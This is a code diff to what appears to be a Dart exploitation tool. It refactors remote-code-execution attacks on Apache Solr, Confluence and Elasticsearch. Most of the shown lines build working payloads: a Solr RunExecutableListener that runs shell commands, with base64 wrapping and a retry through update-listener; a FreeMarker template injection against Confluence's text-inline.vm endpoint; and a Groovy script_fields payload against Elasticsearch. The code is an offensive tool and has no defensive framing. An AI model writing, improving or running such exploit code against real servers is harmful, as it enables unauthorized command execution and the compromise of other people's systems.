@@ -3,6 +3,7 @@ import 'dart:convert';
 import 'package:http/http.dart' as http;
 
 import 'exp_result.dart';
+import 'rce_encoder.dart';
 
 class SolrExpService {
   final String baseUrl;
@@ -59,23 +60,36 @@ class SolrExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final listenerPayload = jsonEncode({
-        'add-listener': {
-          'event': 'postCommit',
-          'name': 'matrix_exploit',
-          'class': 'solr.RunExecutableListener',
-          'exe': 'bash',
-          'dir': '/bin/',
-          'args': ['-c', cmd],
-        },
-      });
-      await http
+      const listenerName = 'matrix_exploit';
+      final listener = {
+        'event': 'postCommit',
+        'name': listenerName,
+        'class': 'solr.RunExecutableListener',
+        'exe': 'sh',
+        'dir': '/bin/',
+        'args': ['-c', RceEncoder.shellBase64Wrap(cmd)],
+      };
+
+      var configRes = await http
           .post(
             Uri.parse('$_base/solr/$coreName/config'),
             headers: {'Content-Type': 'application/json'},
-            body: listenerPayload,
+            body: jsonEncode({'add-listener': listener}),
           )
           .timeout(timeout);
+
+      // Solr returns HTTP 200 even when add-listener fails because the name
+      // already exists; detect this by inspecting the response body and
+      // retry with update-listener.
+      if (configRes.body.contains('already exists')) {
+        configRes = await http
+            .post(
+              Uri.parse('$_base/solr/$coreName/config'),
+              headers: {'Content-Type': 'application/json'},
+              body: jsonEncode({'update-listener': listener}),
+            )
+            .timeout(timeout);
+      }
 
       await http
           .post(
@@ -140,8 +154,7 @@ class ConfluenceExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      // Escape double quotes so the cmd survives inside the FreeMarker string literal.
-      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
+      final escaped = RceEncoder.escapeDoubleQuoted(cmd);
       final res = await http
           .post(
             Uri.parse('$_base/template/aui/text-inline.vm'),
@@ -258,9 +271,7 @@ class ElasticsearchExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      // Build the Groovy script with the command as a Groovy list to avoid
-      // any quoting issues (ES 1.x Groovy accepts GString list execution).
-      final cmdBytes = cmd.codeUnits.join(',');
+      final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final payload = jsonEncode({
         'size': 1,
         'script_fields': {
